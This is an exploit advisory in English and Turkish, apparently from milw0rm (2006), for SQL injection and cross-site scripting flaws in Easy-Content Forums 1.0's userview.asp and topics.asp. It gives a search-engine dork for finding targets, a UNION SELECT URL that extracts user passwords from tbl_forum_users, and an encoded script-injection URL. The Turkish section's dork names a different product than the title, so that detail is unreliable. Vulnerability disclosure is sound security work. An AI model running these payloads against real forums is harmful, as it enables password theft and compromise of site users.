ENGLISH
# Title  :   Easy-Content Forums 1.0 Multiple SQL/XSS Vulnerabilities
# Dork   :   "Copyright 2004 easy-content forums"
# Author :   ajann
# Exploit;

SQL INJECT.ON--------------------------------------------------------
###  http://[target]/[path]/userview.asp?startletter=SQL TEXT
###  http://[target]/[path]/topics.asp?catid=1'SQL TEXT =>catid=x

Example:
http://[target]/[path]/topics.asp?catid=1 union+select+0,password,0,0,0,0,0,0,0,0+from+tbl_forum_users

XSS--------------------------------------------------------
###  http://[target]/[path]/userview.asp?startletter=xss TEXT
### http://[target]/[path]/topics.asp?catid=30&forumname=XSS TEXT

Example:
http://[target]/[path]/topics.asp?catid=30&forumname=%22%3E%3Cscript%3Ealert%28%27X%27%29%3B%3C%2Fscript%3E%22%3E%3Cscript%3Ealert%28%27X%27%29%3B%3C%2Fscript%3E == X




TURKISH
# Ba.l.k          :   Easy-Content Forums 1.0 Multiple SQL/XSS Vulnerabilities
# Sözcük[Arama]   :   "powered by phpmydirectory"
# Aç... Bulan     :   ajann
# Aç.k bulunan dosyalar;

SQL INJECT.ON--------------------------------------------------------
###  http://[target]/[path]/userview.asp?startletter=SQL SORGUNUZ
###  http://[target]/[path]/topics.asp?catid=1'SQL SORGUNUZ =>catid=De.i.ken

Örnek:
http://[target]/[path]/topics.asp?catid=1 union+select+0,password,0,0,0,0,0,0,0,0+from+tbl_forum_users

XSS--------------------------------------------------------

###  http://[target]/[path]/userview.asp?startletter=XSS KODLARINIZ
### http://[target]/[path]/topics.asp?catid=30&forumname=XSS KODLARINIZ

Örnek:
http://[target]/[path]/topics.asp?catid=30&forumname=%22%3E%3Cscript%3Ealert%28%27X%27%29%3B%3C%2Fscript%3E%22%3E%3Cscript%3Ealert%28%27X%27%29%3B%3C%2Fscript%3E Ekrana X uyar.s. c.kar.cakt.r.

Ac.klama:
userview.asp , topics.asp dosyalar.nda bulunan filtreleme eksikli.i nedeniyle sql sorgu cal.st.r.labilmektedir.
userview.asp , topics.asp dosyalar.nda bulunan filtreleme eksikli.i nedeniyle xss kodlar. cal.sabilmektedir.

# milw0rm.com [2006-05-26]